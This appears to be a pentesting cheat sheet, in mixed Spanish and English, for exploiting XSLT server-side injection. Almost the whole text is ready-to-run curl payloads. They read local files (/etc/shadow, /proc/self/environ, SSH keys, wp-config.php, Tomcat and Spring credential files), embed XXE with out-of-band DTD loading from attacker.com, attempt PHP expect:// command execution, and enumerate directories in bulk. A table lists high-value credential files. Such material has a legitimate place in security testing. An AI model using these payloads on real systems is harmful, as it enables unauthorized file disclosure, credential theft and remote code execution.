---
aliases:
  - XSLT document function
  - XSLT File Read
  - XSLT LFI
tags:
  - vuln/xslt-injection
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
  - "[[XML External Entity (XXE)]]"
---
# XSLT - Lectura de Archivos (document)

***

## Función document()

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///etc/tomcat9/server.xml&apos;)"/>' https://target/transform` | Read XML local Linux server.xml | Solo XML válido. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///C:/inetpub/wwwroot/web.config&apos;)"/>' https://target/transform` | Read IIS web.config connection strings | Windows IIS. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/passwd&apos;)"/>' https://target/transform` | Read raw text Saxon 2.0+ (cualquier texto) | Saxon 2.0+. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/shadow&apos;, &apos;UTF-8&apos;)"/>' https://target/transform` | Read con charset forced UTF-8 | Encoding-aware. |
| `curl -X POST --data '<xsl:for-each select="unparsed-text-lines(&apos;file:///etc/passwd&apos;)"><xsl:value-of select="."/></xsl:for-each>' https://target/transform` | Per-line iteration XPath 3.0 | XPath 3.0. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///proc/self/environ&apos;)"/>' https://target/transform` | Read process env vars | High-value secrets. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///proc/self/cmdline&apos;)"/>' https://target/transform` | Read process CLI args | CLI args reveal `-Dpassword=`. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text-available(&apos;file:///root/.ssh/id_rsa&apos;)"/>' https://target/transform` | Boolean oracle file existence sin contenido | Boolean oracle. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;../../../../etc/passwd&apos;)"/>' https://target/transform` | Relative path traversal | Path traversal. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;..%2F..%2Fetc%2Fpasswd&apos;)"/>' https://target/transform` | URL-encoded traversal filter bypass | Encoding bypass. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://attacker.com/wrap.xsl&apos;)"/>' https://target/transform` (attacker hosts wrap.xsl que lee non-XML) | External wrapper for non-XML reads | External XSL wrapper. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///var/www/html/wp-config.php&apos;)"/>' https://target/transform` | wp-config.php read | WordPress. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/tomcat9/tomcat-users.xml&apos;)"/>' https://target/transform` | Tomcat admin hashes | Tomcat creds. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///opt/app/application.properties&apos;)"/>' https://target/transform` | Spring DB creds | Spring app. |
^xslt-lfi-document

### Archivos de alto valor

| OS / Stack | Path | Contenido |
|---|---|---|
| Linux | `/etc/passwd` | Users + UIDs |
| Linux | `/proc/self/environ` | Env vars (creds en deploys) |
| Tomcat | `/etc/tomcat9/tomcat-users.xml` | Hashes admin |
| Spring | `application.properties` / `application.yml` | DB creds |
| WordPress | `/var/www/html/wp-config.php` | DB password |
| Windows | `C:/inetpub/wwwroot/web.config` | Connection strings |
| .NET | `appsettings.json` | Secrets |

___

## XXE dentro de XSLT

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | Classic XXE file read in XSLT context | Parser sin entity block. |
| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | Windows XXE win.ini read | Windows. |
| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><xsl:stylesheet ...><xsl:template match="/"></xsl:template></xsl:stylesheet>' https://target/transform` | Param entity OOB DTD load stage-2 | OOB DTD. |
| `curl -X POST --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform' \| base64 -d` | PHP filter base64 source disclosure | PHP filter. |
| `curl -X POST --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "expect://id">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | PHP expect:// RCE | PHP expect ext. |
| `python3 xxer.py -u https://target/transform -p XSLT-XXE` (custom) | DIY XXE-in-XSLT scanner | DIY scanner. |
| Burp Repeater → modify request → inject DOCTYPE before xsl:stylesheet | Manual XXE-in-XSLT inject | Workflow. |
| `curl -X POST --data @xxe-in-xslt.xml https://target/transform` (load from file) | Load XXE payload from file | Big payload. |
^xslt-lfi-xxe

### Stylesheet completo XXE-en-XSLT

```xml
<?xml version="1.0"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&xxe;</output>
  </xsl:template>
</xsl:stylesheet>
```

___

## Lectura de Directorios

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*;recurse=no&apos;)"><xsl:value-of select="document-uri(.)"/><xsl:text>&#10;</xsl:text></xsl:for-each>' https://target/transform` | Dir listing Saxon 9+ con glob | Saxon collection. |
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///var/www/?select=*;recurse=yes&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Recursive dir listing | Recurse. |
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.conf&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Filter `.conf` files | Extension filter. |
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.bak&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Filter `.bak` backups | Backups. |
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*;metadata=yes&apos;)"><xsl:copy-of select="."/></xsl:for-each>' https://target/transform` | Metadata size/modified | Metadata. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///etc/&apos;)"/>' https://target/transform` | Pass dir as file (some engines list) | Edge engine. |
| `curl -X POST --data '<xsl:value-of select="document(&apos;file:///proc/self/fd/&apos;)"/>' https://target/transform` | libxslt /proc fd listing | libxslt /proc. |
| `for dir in /etc /var/www /opt /home /root; do echo "[$dir]"; curl -X POST --data "<xsl:for-each select=\"collection('file://$dir/?select=*')\"><xsl:value-of select=\"document-uri(.)\"/></xsl:for-each>" https://target/transform; done` | Bulk dir enum loop | Bulk enum. |
| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.xml;recurse=yes&apos;)"><xsl:value-of select="document-uri(.)"/><xsl:text>&#10;</xsl:text></xsl:for-each>' https://target/transform \| sort -u` | Bulk XML files recursive enum | XML-config enum. |
^xslt-lfi-dirs

***
